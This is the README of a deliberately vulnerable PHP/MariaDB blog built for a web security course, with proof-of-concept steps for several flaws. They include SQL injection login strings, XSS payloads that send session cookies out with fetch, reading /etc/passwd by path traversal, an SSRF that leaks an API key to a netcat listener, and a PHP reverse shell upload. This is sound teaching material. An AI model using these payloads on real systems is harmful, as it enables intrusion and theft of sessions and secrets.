# VulnBlog

A vulnerable PHP/MariaDB web application created for the BIF-5/WEBSEC course.

## Setup
**Note:** `setup.sh` enables apache2 and mariadb at startup.

```
git clone https://github.com/FelixSchuster/VulnBlog
sudo chmod +x setup.sh
sudo ./setup.sh
```

## Default Credentials
Database:
- `vulnuser`:`P@ssword`

Webpage:
- `admin`:`admin`
- `felix`:`P@ssword`

Passwords are currently saved in plain text, might change this later on.. or not, it's just another vulnerability to test for.

## Vulnerabilities / Proof of Concept

### A01:2021 – Broken Access Control
#### Example 1
In the navbar select 'Previously created Blogposts' and edit any blogpost.
You can edit blogposts of other users by editing the id parameter in the url.
```
http://127.0.0.1/vulnblog/index.php?page=edit_blogpost.php&id=<EDIT THIS>
```

### A03:2021 – Injection
#### Example 1: SQL Injection
The login form is injectable:
```
http://127.0.0.1/vulnblog/index.php?page=login.php
```

Valid SQL injection queries are:
```
' or 1=1 #
admin' #
```

#### Example 2: Stored Cross-Site-Scripting
Create a blogpost including the following payload:
```
<script>alert("XSS");</script>
```

Try hijacking a php session cookie using the payload:
```
<script>fetch('http://127.0.0.1:1234/'+document.cookie);</script>
```

Additionally start a netcat listener using:
```
nc -lvnkp 1234
```

### A04:2013 - Insecure Direct Object References
#### Example 1
Try accessing:
```
http://127.0.0.1/vulnblog/index.php?page=../../../../../../../../etc/passwd
```

### 2021 - Server-Side Request Forgery (SSRF)
Clicking on Dogs sends a GET Request with an imaginery API Key to the dog ceo API.
The URL looks like that: http://localhost/vulnblog/index.php?page=dogs.php&url=https://dog.ceo/api/breeds/image/random

We can change the url to our own webserver: &url=http://localhost:8888

Start a listener, resend the request and retrieve the secret:
```bash
alex@kali:~/VulnBlog$ nc -lvnp 8888                                  
listening on [any] 8888 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 60404
GET / HTTP/1.1
Host: localhost:8888
Authorization: Basic VG9wU2VjcmV0QXBpS2V5ITo=
Accept: */*

alex@kali:~/VulnBlog$ echo "VG9wU2VjcmV0QXBpS2V5ITo=" | base64 -d    
TopSecretApiKey!:
```

### A03:2017 – Sensitive Data Exposure
#### Example 1:
The Vulnblog rents the option to upload images in blog entries. "The access is not protected, this allows users to navigate to the directory and get access to the uploads.
```
http://localhost/vulnblog/uploads/
```
### A03:2007 - Malicious File Execution
#### Example 1:
Unrestricted file uploads:

You can upload a PHP script to execute malicious code.
Try to upload the php-reverse-shell script to get acces to the server.
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
The file will be executed.

After that you need to get access to the server to use the reverse shell.
Use netcat to listen to port 1234.
```
nc -lvnp 1234
```
Now you can test if you are connected to the web server.
```
whoami
```

## Database
For further information see `./database/db.sql`.

![Database Diagram](./database/db.drawio.png)